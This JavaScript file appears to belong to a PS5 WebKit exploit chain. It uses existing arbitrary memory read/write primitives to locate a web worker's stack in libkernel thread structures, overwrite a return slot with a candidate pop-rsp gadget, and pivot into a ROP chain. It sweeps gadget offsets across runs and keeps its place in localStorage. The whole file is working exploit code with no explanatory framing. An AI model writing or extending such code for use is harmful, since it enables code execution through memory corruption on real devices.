// worker_sweep_1340.js — pop-rsp candidate sweep, one per run (wrong guess = tab death, no signal).
// Index persists in localStorage; each fresh attempt-1 run tries the next candidate.
// Chain = 64x getpid (only candidate + proven LK stub). Verdict via msg2 probe.
(async () => {
  const say = async (s) => { try { await log("[wsweep] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  const CANDS = [0xA1138,0xE1138,0x6138,0xB1138,0x9138,0xC1138,0x8138,0x1872,0xD3C6,0xA1138+0x4000,0xA1138-0x4000,0xA1238,0xA1038,0xA1338,0xA0F38,0xA1638,0xA1338+0x200,0x1076D,0x394C0];
  let idx = 0;
  try{ idx = parseInt(localStorage.getItem("wsweep_idx")||"0",10)||0; }catch(e){}
  if(idx >= CANDS.length){ await say("SWEEP EXHAUSTED, reset localStorage to restart"); return; }
  const PRSP = CANDS[idx];
  try{ localStorage.setItem("wsweep_idx", String(idx+1)); }catch(e){}
  await say("try "+idx+"/"+(CANDS.length-1)+" poprsp=0x"+PRSP.toString(16));
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1){ await say("ABORT retfp="+cnt); return; }
  const cbase = malloc(0x1000);
  let entry = cbase+0x100n;
  if(entry&8n) entry += 8n;
  for(let i=0;i<64;i++) write64(entry+BigInt(i*8), LK+0x1B860n);
  write64(retslot, WK+BigInt(PRSP));
  write64(retslot+8n, entry);
  await say("fired");
  worker.onmessage = () => { try{ log("[wsweep] msg1 ECHO (worker alive at fire)"); }catch(e){} };
  worker.postMessage(0);
  await new Promise((r)=>setTimeout(r,700));
  worker.onmessage = () => { try{ log("[wsweep] msg2 ANSWER2 => candidate 0x"+PRSP.toString(16)+" MISSED"); }catch(e){} };
  try{ worker.postMessage(0); }catch(e){}
  await new Promise((r)=>setTimeout(r,1200));
  await say("probe2 over, no ANSWER2 => candidate 0x"+PRSP.toString(16)+" SPINNING (works!) or tab dying");
  try{ send_notification("wsweep done"); }catch(e){}
})();
